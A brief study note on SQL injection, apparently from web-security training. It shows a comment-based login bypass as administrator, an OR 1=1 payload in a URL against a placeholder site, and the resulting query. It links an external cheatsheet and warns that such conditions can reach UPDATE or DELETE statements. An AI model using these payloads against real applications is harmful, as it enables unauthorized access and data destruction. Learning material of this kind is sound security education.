# SQL Injection

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main




Even if it appears to be harmless, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.